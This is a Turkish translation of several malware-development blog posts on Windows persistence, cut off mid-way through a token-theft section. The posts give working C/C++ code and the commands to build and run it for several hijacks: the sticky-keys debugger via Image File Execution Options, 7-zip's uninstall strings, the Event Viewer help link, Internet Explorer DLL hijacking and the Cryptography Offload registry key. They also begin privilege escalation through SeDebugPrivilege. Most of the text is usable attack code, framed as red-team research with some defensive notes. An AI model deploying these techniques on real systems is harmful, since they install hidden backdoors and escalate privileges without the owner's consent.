Ancak burada bir nüans var. Eğer powershell, yürütme politikası atlama modu olmadan çalıştırılırsa, bu kalıcılık yöntemi benim durumumda çalışmaz:
+++++++++++++++++++++++++++++++++++++++++++++++
Ayrıca, sahip olduğunuz ayrıcalıklara bağlı olarak kötüye kullanabileceğiniz dört farklı PowerShell profili yeri vardır:
$PROFILE | select *
+++++++++++++++++++++++++++++++++++++++++++++++
PowerShell profil betiğine rastgele talimatlar ekleyerek, PowerShell profilleri birçok kod yürütme fırsatı sunar. Kullanıcının PowerShell'i başlatmasına güvenmemek için, belirli bir saatte PowerShell çalıştıran planlanmış bir görev kullanabilirsiniz.
Önlemler
Yalnızca imzalı PowerShell betiklerinin çalıştırılmasını zorunlu kılın. Profilleri değiştirilmemeleri için imzalayın. Ayrıca, gerekmediğinde PowerShell profillerini devre dışı bırakabilirsiniz, örneğin -No-Profile bayrağıyla.
Bu kalıcılık yöntemi vahşi doğada Turla grubu tarafından kullanılmıştır.
Umarım bu yazı, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
Microsoft PowerShell profiles
MITRE ATT&CK. Event Triggered Execution: PowerShell Profile
Turla
Github’taki kaynak kod

78. Zararlı yazılım geliştirme: Kalıcılık - Bölüm 12. Erişilebilirlik Özellikleri. Basit C++ örneği.
﷽


+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, erişilebilirlik özellikleri aracılığıyla yönetici düzeyinde bir başka zararlı yazılım kalıcılığı tekniği üzerine yaptığım araştırmaların bir sonucudur.
Önceki gönderilerimden birinde, Image File Execution Options aracılığıyla kalıcılığı ele almıştım. Bir PoC (Proof of Concept) örneğinde, yalnızca aşağıdaki kayıt defteri anahtarında bir hata ayıklayıcı oluşturarak hedef süreci manipüle etmiştik:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe
Daha sonra, yalnızca kötü amaçlı uygulamanın System32 dizinine yerleştirilmesi yeterli oluyordu.
Pratik Örnek: sethc.exe
Bugün, hedef sürecimizi sethc.exe ile değiştireceğiz. Peki, sethc.exe nedir?
Bu dosya, yapışkan tuşlar özelliğinden sorumludur. Shift tuşuna 5 kez basıldığında, bu özellik etkinleşir.
+++++++++++++++++++++++++++++++++++++++++++++++

Orijinal sethc.exe yerine, sahte sethc.exe çalıştırılacaktır. Her zamanki gibi, basitlik açısından bu yalnızca bir "meow" mesaj kutusudur.Kaynak kodu oldukça benzerdir (pers.cpp):
/*
pers.cpp
windows persistence via Accessibility Features
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// image file
const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
File Execution Options\\sethc.exe";

// evil app
const char* exe = "C:\\Windows\\System32\\hack.exe";

// Debugger
LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry key
// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
// Execution Options\sethc.exe" /v Debugger /d "hack.exe"
RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe,
strlen(exe));
RegCloseKey(hkey);
}
return 0;
}

Meow-meow mesaj kutusu:

/*
hack.cpp
evil app for windows persistence
via Accessibility Features
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}

Demo 
Haydi, her şeyin nasıl çalıştığını görelim. Öncelikle, kayıt defteri anahtarlarını kontrol edelim:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Image File Execution Options" /s

+++++++++++++++++++++++++++++++++++++++++++++++

pers.cpp dosyamızı derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Çalıştırın ve kayıt defteri anahtarlarını tekrar kontrol edin:
Gerçek Windows ikili dosyasını değiştirmek için yönetici ayrıcalıklarına sahip olmanız gerekir.
.\pers.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options\sethc.exe" /s

+++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, Shift tuşuna 5 kez basın:
+++++++++++++++++++++++++++++++++++++++++++++++

hack.exe dosyasının özelliklerine dikkat edin:
+++++++++++++++++++++++++++++++++++++++++++++++
Mükemmel! =..=
Deneylerin sonunda temizleme işlemi için şu komutu çalıştırın:
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
File Execution Options\sethc.exe" -Force -Verbose

+++++++++++++++++++++++++++++++++++++++++++++++

Sonuç
Windows Erişilebilirlik Özellikleri, Windows oturum açma ekranı üzerinden erişilebilen yardımcı programlar koleksiyonudur (örneğin, Sticky Keys).
Bazı erişilebilirlik özellikleri, bunların tetikleme kombinasyonları ve konumları şunlardır:
Utility Manager
C:\Windows\System32\Utilman.exe
Tetikleyici: Windows tuşu + U
Ekran Klavyesi
C:\Windows\System32\osk.exe
Tetikleyici: Ekran klavyesi düğmesine tıklamak
Büyüteç
C:\Windows\System32\Magnify.exe
Tetikleyici: Windows Tuşu + =
Ekran Okuyucu
C:\Windows\System32\Narrator.exe
Tetikleyici: Windows Tuşu + Enter
Ekran Değiştirici
C:\Windows\System32\DisplaySwitch.exe
Tetikleyici: Windows Tuşu + P
Bu Windows özellikleri, APT gruplarının hedef bilgisayarlara arka kapı yerleştirmek için bunları kötüye kullanmasıyla iyi bilinir hale gelmiştir. Örneğin, APT3, APT29 ve APT41 grupları Sticky Keys yöntemini kullanmıştır.
Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
MITRE ATT&CK. Event Triggered Execution: Accessibility Features
APT3
APT29
APT41
Github’taki kaynak kod


79. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 13. Bir Uygulamanın Kaldırma Mantığını Ele Geçirme. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, hedef uygulamanın kaldırma dosyasını ele geçirerek kötü amaçlı yazılım kalıcılığı sağlama konusunda kendi araştırmalarımın bir sonucudur.
Kaldırma Süreci
Windows sistemine bir program yüklediğinizde, genellikle kendi kaldırıcılarına yönlendirilirler. Bunlar şu kayıt defteri anahtarlarında bulunur:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<uygulama adı>
ve
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\<uygulama adı>
Peki, numara nedir? Bunları, başka herhangi bir programı çalıştırabilecek komutlarla değiştirmekte bir sakınca yoktur. Bir kullanıcı kaldırıcıyı çalıştırdığında, saldırganın seçtiği komut çalıştırılır. Yine de iyi haber şu ki, bu öğeleri değiştirmek için ayrıcalıklar gereklidir, çünkü HKLM anahtarı altında yer alırlar.
Pratik Örnek
Hadi pratik bir örneğe bakalım. Öncelikle, bir hedef uygulama seçelim. Ben 7-zip x64'ü seçtim:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, doğruluk açısından kayıt defteri anahtar değerlerini kontrol edin:
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, kötü amaçlı uygulamamı hazırladım. Her zamanki gibi, "meow-meow" kötü amaçlı yazılımı :)
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, kalıcılık için mantığımı gerçekleştiren bir program oluşturdum (pers.cpp):
/*
pers.cpp
windows persistence via
hijacking uninstall app
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/04/malware-pers-13.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// target app
const char* app =
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";

// evil app
const char* exe =
"C:\\Users\\User\\Documents\\malware\\2022-10-04-malware-pers-13\\hack.exe";

// app
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// update registry key value
// reg add
//"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\
// 7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)
exe, strlen(exe));
RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ,
(unsigned char*)exe, strlen(exe));
RegCloseKey(hkey);
}
return 0;
}
Gördüğünüz gibi mantık basit, sadece kayıt defterindeki hedef anahtar değerlerini güncelliyoruz.
Demo
Hadi her şeyi aksiyonda görelim. Kötü amaçlı yazılımı ve kalıcılık betiğini derleyin:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
Ve bunu kurbanın makinesinde çalıştırın - benim durumumda Windows 10 x64:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, sistemimi yeniden başlattıktan sonra 7-zip'i kaldırmayı denedim:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından Process Hacker 2'de hack.exe'nin özelliklerine baktım:
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi üst işlem SystemSettings.exe - Windows ayarlarını açtığınızda gördüğünüz şeydir. Bizim durumumuzda, bu program ekle/kaldır kısmıdır. Mükemmel!=..=
Küçük bir sorun var. Anahtarı Z:\2022-10-04-malware-pers-13\hack.exe yoluyla güncellemeye çalıştığımda şu hatayı alıyorum:
+++++++++++++++++++++++++++++++++++++++++++++++
Belki de yalnızca C:\ diski içindeki yolları kullanabilirsiniz.
Deneylerin sonunda temizleme işlemi yapın:
reg add
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip"
/v "UninstallString" /t REG_SZ /d "C:\Program Files\7-zip\Uninstall.exe" /f

+++++++++++++++++++++++++++++++++++++++++++++++
Sonuç
Elbette, belki de bu numara kalıcılık için o kadar da harika değildir, çünkü kullanıcının izinleri ve katılımı gereklidir. Ama neden olmasın?
Kalıcılık için programları yükleyip kaldırmayı kullanarak bir numara daha var, bunun hakkında gelecekteki gönderilerimden birinde yazacağım. Bu olasılığı kırmızı takım için araştırmaya devam ediyorum.
Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyeleri için bir silah ekler.
RegOpenKeyEx
RegSetValueEx
RegCloseKey
reg query
Github’taki kaynak kod


80. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 14. Olay Görüntüleyici yardım bağlantısı. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, Windows Olay Görüntüleyicisi yardım bağlantısını değiştirerek kötü amaçlı yazılım kalıcılığı sağlama üzerine yaptığım kendi araştırmamın sonucudur.
olay görüntüleyici yardım bağlantısı
Windows’un Olay Görüntüleyicisi on yılı aşkın süredir var. Olay Görüntüleyici, bilgisayarınızda Windows’un tuttuğu sınırlı sayıda günlük kaydını inceler. Günlükler, düz içerik içeren XML biçimli metin dosyalarıdır.
+++++++++++++++++++++++++++++++++++++++++++++++
Olay Görüntüleyicinin kullanıcı arayüzünün bir parçası olarak, Olay Günlüğü Çevrimiçi Yardımı bağlantısı sağlanır:
+++++++++++++++++++++++++++++++++++++++++++++++
Bağlantıya tıklandığında, Windows kayıt defterinde tanımlanan varsayılan bir Microsoft yardım bağlantısı açılır
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer:

+++++++++++++++++++++++++++++++++++++++++++++++

Tahmin ettiğiniz gibi, MicrosoftRedirectionURL anahtarının değerinin bir saldırganın çıkarlarına uygun şekilde değiştirilebileceğini varsaymak mantıklıdır. İşte numara burada.
pratik örnek
Hadi pratik bir örneğe bakalım. Öncelikle her zamanki gibi kötü amaçlı uygulamayı oluşturalım, meow-meow “malware” (hack.cpp):
/*
hack.cpp
evil app for windows persistence via
event viewer help link update
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Ardından, kalıcılık için bir program oluşturalım (pers.cpp):
/*
pers.cpp
windows persistence via
replace event viewer help link
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// event viewer
const char* app =
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer";

// evil app
const char* exe =
"file://Z:\\2022-10-09-malware-pers-14\\hack.exe";

// app
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// update registry key value
// reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event
// Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d
// "file://...\hack.exe" /f
RegSetValueEx(hkey, (LPCSTR)"MicrosoftRedirectionUrl", 0, REG_SZ, (unsigned char*)exe, s
RegCloseKey(hkey);
}
return 0;
}
Gördüğünüz gibi, mantık basittir, sadece kayıt defteri anahtarının değerini file://Z:\2022-10-09-malware-pers-14\hack olarak günceller.
demo
Hadi her şeyi aksiyon halinde görelim. "Kötü amaçlı yazılımı" derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Doğruluğunu kontrol edelim:
+++++++++++++++++++++++++++++++++++++++++++++++

ve kalıcılık betiğini derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
Hedef makinedeki varsayılan kayıt defteri anahtarlarını kontrol edelim - benim durumumda Windows 10 x64:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, aynı şekilde hedef makinede çalıştıralım - benim durumumda Windows 10 x64:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Son olarak, Olay Günlüğü Çevrimiçi Yardımı bağlantısına tekrar tıklamayı deneyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, hack.exe’nin özelliklerine Process Hacker 2’de baktım:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Bu, bağlantıya tıklandığında mmc.exe’nin başlatıldığını ve bunun da kötü amaçlı davranışı tetiklediğini gösteriyor.
Deneylerden sonra geri almak için şu komutu çalıştırın:
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v
"MicrosoftRedirectionUrl" /t REG_SZ /d
"http://go.microsoft.com/fwlink/events.asp" /f
+++++++++++++++++++++++++++++++++++++++++++++++

veya sanal makineyi geri yükleyin.
Bu, yönetici düzeyinde bir kötü amaçlı yazılım kalıcılık tekniğidir, bu nedenle yalnızca yönetici izinleriyle çalışır.
Bu taktiğin ve tekniğin vahşi doğada herhangi bir APT (Gelişmiş Kalıcı Tehdit) tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu gönderinin, özellikle yazılım geliştirirken, mavi takım çalışanlarının bu ilginç teknik hakkında farkındalığını artırmasını ve kırmızı takım çalışanlarının cephaneliğine bir silah daha eklemesini umuyorum.
Event Viewer
RegOpenKeyEx
RegSetValueEx
RegCloseKey
reg query
Github’taki kaynak kod


81. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 15. Internet Explorer. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, Internet Explorer aracılığıyla kötü amaçlı yazılım kalıcılığına dair ilginç bir teknik üzerine kendi araştırmamın sonucudur.
internet explorer
Önceki gönderilerimden birinde, DLL kaçırmanın gerçek dünya örneğinden bahsetmiştim. Bu sefer kurban Internet Explorer. Eminim çoğunuz onu kullanmıyorsunuzdur ve Windows sisteminden kasıtlı olarak silmeniz pek olası değildir.
pratik örnek
Önceki gönderimde olduğu gibi, sysinternals’tan procmon’u çalıştırıp aşağıdaki filtreleri ayarlayalım:
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından Internet Explorer’ı çalıştırın:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, iexplore.exe süreci eksik birkaç DLL içeriyor ve bunlar muhtemelen DLL kaçırma için kullanılabilir. Örneğin suspend.dll:
+++++++++++++++++++++++++++++++++++++++++++++++

Hadi başka olası konumları arayalım, belki elimizde geçerli bir DLL vardır:
cd C:\
dir /b /s suspend.dll
+++++++++++++++++++++++++++++++++++++++++++++++

Ancak gördüğünüz gibi, dosya bulunamadı, yani bu DLL yalnızca Internet Explorer tarafından kullanılıyor.


Daha sonra “kötü” DLL’imi hazırladım, meow-woof mesaj kutusu:
/*
evil.c - malicious DLL
DLL hijacking. Internet Explorer
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
LPVOID lpReserved) {
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH:
	MessageBox(
NULL,
"Meow-woof!",
"=^..^=",
MB_OK
);
	break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
demo
Hadi her şeyi çalışırken görelim. Kötü amaçlı DLL’imizi derleyelim:
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra dosyayı suspend.dll olarak adlandırıp Internet Explorer’ın yüklendiği dizine yerleştiriyorum:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ve son olarak kurban uygulamamızı çalıştırmayı deniyoruz:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Pop-up’ı kapattıktan sonra IE düzgün çalışıyor, çökmedi:
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi çalıştı. Mükemmel! =..=

sonuç
Şimdi IE üzerinden kalıcılığı başardık.


Bu yüzden bu gönderi kalıcılık kategorisine giriyor; kötü amaçlı DLL’imiz, kullanıcı IE’yi her başlattığında çalışacak. Ve kapattıklarında da. Windows severler için sürpriz!
Herhangi bir şey yüklemenize veya kaldırmanıza bile gerek yok.
Bu yöntem Windows 11 x64 üzerinde de çalışıyor:
+++++++++++++++++++++++++++++++++++++++++++++++
Her ne kadar 2022 yılında birinin IE’yi çalıştırması pek olası olmasa da, katılır mısınız?
Bir Windows hata avcısı olarak, işletim sisteminde ayrıcalık yükseltme açıklarını bulmak istiyorsanız, genellikle temiz bir Windows kurulumu ile boş bir sayfadan başlamak istersiniz.
APT gruplarından herhangi birinin bu taktiği ve hileyi kullanıp kullanmadığını bilmiyorum, ancak umarım bu gönderi, yazılım geliştirirken özellikle mavi takım üyelerinin farkındalığını artırır ve kırmızı takım üyeleri için bir silah ekler.
DLL hijacking
DLL hijacking with exported functions
Github’taki kaynak kod


82. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 16. Kriptografi Kayıt Defteri Anahtarları. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu makale, kötü amaçlı yazılım kalıcılığına yönelik ilginç bir teknik olan Kriptografi Kayıt Defteri Anahtarı aracılığıyla yapılan bir araştırmanın sonucudur.
Kayıt defterini incelerken ilginç bir yol keşfettim:
HKLM\Software\Microsoft\Cryptography
Ve burada OffloadModExpo adlı bir fonksiyon bulunuyor. Doğru anladıysam, bu fonksiyon hem açık anahtar hem de özel anahtar işlemleri için tüm modüler üs alma işlemlerini gerçekleştirmek için kullanılıyor:
+++++++++++++++++++++++++++++++++++++++++++++++
Detaylara fazla girmedim, Windows kayıt defterinde bu anahtarı ve değeri deney yapma fırsatı benim için yeterliydi. Bu yüzden, bu DLL yolunu ele geçirmeyi denedim:

HKLM\Software\Microsoft\Cryptography\Offload ve anahtar değeri.
pratik örnek
Her zamanki gibi önce “kötü amaçlı” DLL oluşturalım. Yine her zamanki gibi meow-meow mesaj kutusu (hack.c):
/*
hack.c - malicious DLL
DLL hijacking Cryptography registry path
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID
lpReserved) {
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH:
MessageBox(
NULL,
"Meow-meow!",
"=^..^=",
MB_OK
);
	break;
	case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Derleyelim:
x86_64-w64-mingw32-gcc -shared -o hack.dll hack.c
+++++++++++++++++++++++++++++++++++++++++++++++
Ve ele geçirme işlemi için bir Proof-of-Concept (PoC) kodu oluşturalım (pers.cpp):
/*
pers.cpp
windows persistence via
hijacking cryptography DLL path
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/21/malware-pers-16.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// reg path
const char* path = "SOFTWARE\\Microsoft\\Cryptography\\Offload";

// evil DLL
const char* evil = "Z:\\2022-10-21-malware-pers-16\\hack.dll";

// create key
LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)path, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
if (res == ERROR_SUCCESS) {
// set registry key value
// reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Offload" /v
// "ExpoOffload" /t REG_SZ /d "...\hack.dll" /f
RegSetValueEx(hkey, (LPCSTR)"ExpoOffload", 0, REG_SZ, (unsigned char*)
evil, strlen(evil));
RegCloseKey(hkey);
}
return 0;
}
Deney için ihtiyacım olan tek şey bu.
demo
Her şeyi çalışırken görelim. Proof-of-Concept kodumuzu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, deneyin saflığını korumak için kurban makinedeki kayıt defteri anahtarlarını kontrol edelim ve varsa silelim:
reg query "HKLM\SOFTWARE\Microsoft\Cryptography\Offload" /s
+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, pers.exe betiğimizi çalıştırıp tekrar kontrol edelim:
+++++++++++++++++++++++++++++++++++++++++++++++

Şimdi bir şeyler çalıştırmayı deneyeceğim. Örneğin, tarayıcıda https:\... bağlantısını açmayı veya arama çubuğunu kullanmayı deneyeceğim.
+++++++++++++++++++++++++++++++++++++++++++++++

Arka planda bazı kriptografik işlemler gerçekleştirilirken, ekranda giderek daha fazla açılır pencere göreceğiz.
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, durumu incelemek için Process Hacker 2 programını bile çalıştıramadım.
+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra sanal makine anlık görüntümü geri yükledim ve şu filtrelerle Sysinternals Procmon'u çalıştırdım:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ve sonuç olarak:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, belirli bir aşamada benim “kötü amaçlı” meow-meow DLL'im svchost.exe, ProcessHacker.exe ve diğer süreçler tarafından yüklendi.
Her şey doğru çalıştı. Mükemmel! =..=
Deneyler tamamlandıktan sonra kayıt defteri durumumu geri yükledim:
+++++++++++++++++++++++++++++++++++++++++++++++

Bu taktik ve yöntemin vahşi doğada herhangi bir APT tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu yazının, özellikle yazılım geliştirirken, mavi takım üyelerinin bu ilginç teknik hakkında farkındalık kazanmasına yardımcı olmasını ve kırmızı takım üyeleri için bir silah eklemesini umuyorum.
OffloadModExpo
DLL hijacking
DLL hijacking with exported functions
Github’taki kaynak kod


83. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 17 - APT teknikleri:  
UpdateProcThreadAttribute aracılığıyla belirteç hırsızlığı. Basit C++ örneği.

﷽

Merhaba, siber güvenlik meraklıları ve beyaz şapkalı hackerlar!

+++++++++++++++++++++++++++++++++++++++++++++++

{:class=“img-responsive”}

Bu gönderi, kendi araştırmalarımın bir sonucu olup, en ilginç APT tekniklerinden biri olan UpdateProcThreadAttribute aracılığıyla belirteç hırsızlığını ele almaktadır.
Önceki gönderimde, DuplicateTokenEx ve CreateProcessWithTokenW kullanarak klasik belirteç hırsızlığından bahsetmiştim. Bugün, Windows Vista’dan itibaren çalışan alternatif bir yöntemi anlatacağım.
UpdateProcThreadAttribute
Eğitimimin ilk bölümünde, klasik bir numara uyguluyoruz: SE_DEBUG_PRIVILEGE’i etkinleştiriyoruz, herhangi bir sistem sürecinin belirtecini açıyoruz (korunan işlemler için bile çalışır), belirteci çoğaltıyoruz, ayrıcalıkları ayarlıyoruz ve ardından bu belirteçle kimliğe bürünüyoruz.
Bugün daha basit bir numara kullanabiliriz. Microsoft, Vista’da yeni bir işlem oluştururken açıkça bir üst işlem belirleme yeteneğini uyguladı ve bu sayede yükseltilmiş işlem, çağıran işlemin bir alt süreci olarak kalabiliyor.
Genellikle, UAC örneğinde, yeni sürece açıkça bir belirteç vermeniz gerekir. Eğer bir belirteç sağlamazsanız, yeni süreç belirlenen üst süreçten devralır.Tek şart, üst sürecin tutamacının PROCESS_CREATE_PROCESS erişim ayrıcalığına sahip olmasıdır.
Bu yüzden, sadece bir sistem sürecini PROCESS_CREATE_PROCESS erişim hakkı ile açıyoruz. Daha sonra bu tutamacı UpdateProcThreadAttribute ile kullanıyoruz. Sonuç olarak, süreciniz sistem sürecinden bir belirteç devralır.
BOOL UpdateProcThreadAttribute(
LPPROC_THREAD_ATTRIBUTE_LIST		 lpAttributeList,
DWORD 						dwFlags,
DWORD_PTR 					Attribute,
PVOID						 lpValue,
SIZE_T						 cbSize,
PVOID						 lpPreviousValue,
PSIZE_T						 lpReturnSize
);
Ve bunun çalışması için tek ihtiyacınız olan şey SE_DEBUG_PRIVILEGE’dir.
Teknik. Pratik Örnek
Öncelikle, bazen mevcut ayrıcalık kümenizde SeDebugPrivilege’i etkinleştirmeniz gerekir:
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(),
TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n", priv);
return res;
}
Ardından, erişim belirtecini çalmak istediğiniz süreci PROCESS_CREATE_PROCESS erişim haklarıyla açın:
HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
Daha sonra, UpdateProcThreadAttribute ile bu tutamacı kullanın:
